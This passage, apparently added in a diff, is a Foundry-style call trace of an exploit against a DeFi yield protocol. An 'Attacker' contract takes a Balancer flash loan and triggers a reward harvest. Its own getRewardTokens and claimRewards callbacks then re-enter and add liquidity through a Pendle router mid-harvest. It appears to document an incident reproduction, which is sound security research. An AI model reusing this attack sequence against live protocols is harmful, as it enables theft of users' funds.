+    │   │   │   │   │   │   │   │   ├─ [3458] 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B::updateFor(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 999999999999999000 [9.999e17])
+    │   │   │   │   │   │   ├─ [67586] 0x16296859C15289731521F199F0a5f762dF6347d0::afterReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17])
+    │   │   │   │   │   │   │   ├─ [66782] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::afterReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ emit NewMarketDeposit(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, param2: 999999999999999000 [9.999e17], param3: 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772, param4: 999999999999999000 [9.999e17])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ emit NewDeposit(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, param2: 999999999999999000 [9.999e17])
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Return] 
+    │   └─ ← [Stop] 
+    ├─ [0] VM::roll(20671878 [2.067e7])
+    │   └─ ← [Return] 
+    ├─ [2832115] Attacker::attack()
+    │   ├─ [12050] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   ├─ [4761] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
+    │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   ├─ [9961] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   ├─ [2642] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
+    │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   ├─ [2755756] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0], [1387144695760709012655 [1.387e21], 906345923203725548764 [9.063e20]], 0x)
+    │   │   ├─ [1550] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   │   ├─ [761] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [34374] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1387144695760709012655 [1.387e21])
+    │   │   │   ├─ [33582] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1387144695760709012655 [1.387e21]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1387144695760709012655 [1.387e21])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1461] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   │   ├─ [642] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
+    │   │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   ├─ [350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [28697] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 906345923203725548764 [9.063e20])
+    │   │   │   ├─ [27875] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 906345923203725548764 [9.063e20]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 906345923203725548764 [9.063e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2659202] Attacker::receiveFlashLoan([0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0], [1387144695760709012655 [1.387e21], 906345923203725548764 [9.063e20]], [0, 0], 0x)
+    │   │   │   ├─ [1872928] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::batchHarvestMarketRewards([0x46F6eE9880d08C66DdB22a4645806672CDb1fb61], 0)
+    │   │   │   │   ├─ [1872118] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::batchHarvestMarketRewards([0x46F6eE9880d08C66DdB22a4645806672CDb1fb61], 0) [delegatecall]
+    │   │   │   │   │   ├─ [2610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 54711902411635297664 [5.471e19]
+    │   │   │   │   │   ├─ [4419] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   ├─ [1036] Attacker::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6]
+    │   │   │   │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 0x808507121B80c02388fAd14726482e061B8da827]
+    │   │   │   │   │   ├─ [2727] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1489388615889064860787 [1.489e21]
+    │   │   │   │   │   ├─ [2779] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1752244364571963529895 [1.752e21]
+    │   │   │   │   │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 54711902411635297664 [5.471e19]
+    │   │   │   │   │   ├─ [1443252] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61::redeemRewards(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   ├─ [1036] Attacker::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6]
+    │   │   │   │   │   │   ├─ [1409214] Attacker::claimRewards(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61)
+    │   │   │   │   │   │   │   ├─ [28768] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::approve(0x888888888889758F76e7103c6CbF23ABbF58F946, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   ├─ [27976] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::approve(0x888888888889758F76e7103c6CbF23ABbF58F946, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [1550] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [761] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   │   │   │   │   │   ├─ [428647] 0x888888888889758F76e7103c6CbF23ABbF58F946::addLiquiditySingleTokenKeepYt(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 1, 1, TokenInput({ tokenIn: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, netTokenIn: 1387144695760709012655 [1.387e21], tokenMintSy: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) }))
+    │   │   │   │   │   │   │   │   ├─ [423656] 0xb7631b93189900745Db51d960Ba64b8E6C658843::addLiquiditySingleTokenKeepYt(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 1, 1, TokenInput({ tokenIn: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, netTokenIn: 1387144695760709012655 [1.387e21], tokenMintSy: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) })) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [404] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::readTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000b1b9150f2085f6a553b547099977181ca802752a0000000000000000000000007aa68e84bcd8d1b4c9e10b1e565db993f68a3e090000000000000000000000003568f1d2e8058f6d99daa17051cb4a2930c83978
+    │   │   │   │   │   │   │   │   │   ├─ [32236] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x888888888889758F76e7103c6CbF23ABbF58F946, 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [31438] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x888888888889758F76e7103c6CbF23ABbF58F946, 1387144695760709012655 [1.387e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 115792089237316195423570985008687907853269984665640564038070439312152420627280 [1.157e77])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [3806] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::allowance(0x888888888889758F76e7103c6CbF23ABbF58F946, 0xb1B9150f2085f6a553b547099977181CA802752A) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [3014] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::allowance(0x888888888889758F76e7103c6CbF23ABbF58F946, 0xb1B9150f2085f6a553b547099977181CA802752A) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564009658468616307634389414 [1.157e77]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564009658468616307634389414 [1.157e77]
+    │   │   │   │   │   │   │   │   │   ├─ [53771] 0xb1B9150f2085f6a553b547099977181CA802752A::deposit(0x888888888889758F76e7103c6CbF23ABbF58F946, 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, 1387144695760709012655 [1.387e21], 1)
+    │   │   │   │   │   │   │   │   │   │   ├─ [17936] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::transferFrom(0x888888888889758F76e7103c6CbF23ABbF58F946, 0xb1B9150f2085f6a553b547099977181CA802752A, 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [17138] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::transferFrom(0x888888888889758F76e7103c6CbF23ABbF58F946, 0xb1B9150f2085f6a553b547099977181CA802752A, 1387144695760709012655 [1.387e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x888888888889758F76e7103c6CbF23ABbF58F946, to: 0xb1B9150f2085f6a553b547099977181CA802752A, value: 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x888888888889758F76e7103c6CbF23ABbF58F946, spender: 0xb1B9150f2085f6a553b547099977181CA802752A, value: 115792089237316195423570985008687907853269984665640564008271323920546925376759 [1.157e77])
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Deposit(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: 0x888888888889758F76e7103c6CbF23ABbF58F946, param2: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, param3: 1387144695760709012655 [1.387e21], param4: 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004b327fef63045cccaf
+    │   │   │   │   │   │   │   │   │   ├─ [11002] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::readState(0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [2876] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::getMarketConfig(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000ad21d57c778785410600000000000000000000000000000000000000000000024e4f4cfc03b28b7aa70000000000000000000000000000000000000000000000e4206f2e3b973674220000000000000000000000008270400d528c34e1596ef367eedec99080a1b592000000000000000000000000000000000000000000000000f850a2e75595b40000000000000000000000000000000000000000000000000000000000676c9c8000000000000000000000000000000000000000000000000000038d0a4e4d254000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000136e2c45e5a1948
+    │   │   │   │   │   │   │   │   │   ├─ [39499] 0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978::pyIndexCurrent()
+    │   │   │   │   │   │   │   │   │   │   ├─ [27134] 0xb1B9150f2085f6a553b547099977181CA802752A::exchangeRate() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [2476] 0x7A05D25E91C478EFFd37Baf86730bB4B84bE1E32::getExchangeRate() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e2faa4679ecca56
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [20846] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::convertToAssets(1022222860106386006 [1.022e18]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20057] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::convertToAssets(1022222860106386006 [1.022e18]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9699] 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7::balanceOf(0xe1B4d34E8754600962Cd944B535180Bd758E6c2e) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2604] 0x60FF20BACD9A647e4025Ed8b17CE30e40095A1d2::balanceOf(0xe1B4d34E8754600962Cd944B535180Bd758E6c2e) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 92368453715354759091 [9.236e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 92368453715354759091 [9.236e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1021427322970892774 [1.021e18]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1021427322970892774 [1.021e18]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1021427322970892774 [1.021e18]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit NewInterestIndex(param0: 1021808138294158423 [1.021e18])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e2e311687a06457
+    │   │   │   │   │   │   │   │   │   ├─ [8902] 0xb1B9150f2085f6a553b547099977181CA802752A::transfer(0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978, 309357942716940430088 [3.093e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x888888888889758F76e7103c6CbF23ABbF58F946, to: 0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978, value: 309357942716940430088 [3.093e20])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [8902] 0xb1B9150f2085f6a553b547099977181CA802752A::transfer(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 1077786753043768582567 [1.077e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x888888888889758F76e7103c6CbF23ABbF58F946, to: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, value: 1077786753043768582567 [1.077e21])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [85198] 0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978::mintPY(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   ├─ [819] 0xb1B9150f2085f6a553b547099977181CA802752A::balanceOf(0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 19753061982819597352230 [1.975e22]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ [1263] 0xb1B9150f2085f6a553b547099977181CA802752A::rewardIndexesCurrent()
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 316104463514107806497 [3.161e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [14463] 0x7aa68E84bCD8d1B4C9e10B1e565DB993f68a3E09::mintByYT(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 316104463514107806497 [3.161e20])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, value: 316104463514107806497 [3.161e20])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Mint(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param2: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param3: 309357942716940430088 [3.093e20], param4: 316104463514107806497 [3.161e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [819] 0xb1B9150f2085f6a553b547099977181CA802752A::balanceOf(0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 19753061982819597352230 [1.975e22]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 316104463514107806497 [3.161e20]
+    │   │   │   │   │   │   │   │   │   ├─ [162595] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::mint(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1077786753043768582567 [1.077e21], 316104463514107806497 [3.161e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [876] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::getMarketConfig(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   │   │   │   │   ├─ [1060] 0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978::pyIndexCurrent()
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e2e311687a06457
+    │   │   │   │   │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ [1304] 0xb1B9150f2085f6a553b547099977181CA802752A::claimRewards(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   ├─ [34184] 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57::redeemMarketReward()
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [33804] 0x7762CbfA8f62999A8A40D800b751686e99A31C9a::redeemMarketReward() [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17593] 0x808507121B80c02388fAd14726482e061B8da827::transfer(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 5463318126898499688 [5.463e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57, to: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, value: 5463318126898499688 [5.463e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit MarketClaimReward(param0: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param1: 5463318126898499688 [5.463e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 4584888938970908540538 [4.584e21]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─ [9051] 0x83d6fa7F8904299F4a9499fE83b6ae3f21FfbA57::4af74b68(000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000760000000000000000000000000000000000000000000000000000000066d756d30000000000000000000000000000000000000000000000000136e2c45e5a194800000000000000000000000000000000000000000000000000000000000000b500000000000000000000000000000000000000000000000000000000000000b5) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000007700000000000000000000000000000000000000000000000000000000000000b5
+    │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000136e2c45e5a1948
+    │   │   │   │   │   │   │   │   │   │   ├─ [819] 0xb1B9150f2085f6a553b547099977181CA802752A::balanceOf(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 11967079985738865698291 [1.196e22]
+    │   │   │   │   │   │   │   │   │   │   ├─ [555] 0x7aa68E84bCD8d1B4C9e10B1e565DB993f68a3E09::balanceOf(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3509829191795584673091 [3.509e21]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Mint(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 416513404704868480106 [4.165e20], param2: 1077786753043768582563 [1.077e21], param3: 316104463514107806497 [3.161e20])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 416513404704868480106 [4.165e20], 1077786753043768582563 [1.077e21], 316104463514107806497 [3.161e20]
+    │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xa9b749795680682fbc5a34071e19282bbb23496a8cf9bbd99bf941359bbe65bf
